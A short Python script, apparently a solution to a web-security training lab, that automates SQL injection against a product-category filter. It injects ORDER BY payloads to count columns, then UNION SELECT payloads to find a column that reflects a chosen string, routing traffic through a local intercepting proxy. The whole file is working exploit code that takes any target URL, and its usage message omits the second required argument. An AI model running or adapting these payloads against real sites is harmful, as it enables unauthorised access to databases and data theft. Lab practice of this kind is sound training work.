import requests
import sys
import urllib3
import bs4

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1,20):  
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col,tokenw):
    path = "filter?category=Gifts"
    
    for i in range(1, num_col+1):
        payload_list = ['null'] * num_col
        payload_list[i-1] = "'"+tokenw+"'"
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        result = requests.get(url + path + sql_payload, verify=False, proxies=proxies)

        soup = bs4.BeautifulSoup(result.content, 'html.parser')

        res = str(soup.find_all("div", {'class':'container is-page'}))

        if tokenw in res:
            #print(soup.prettify())
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        tokenw = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    #print(num_col)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col,tokenw)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")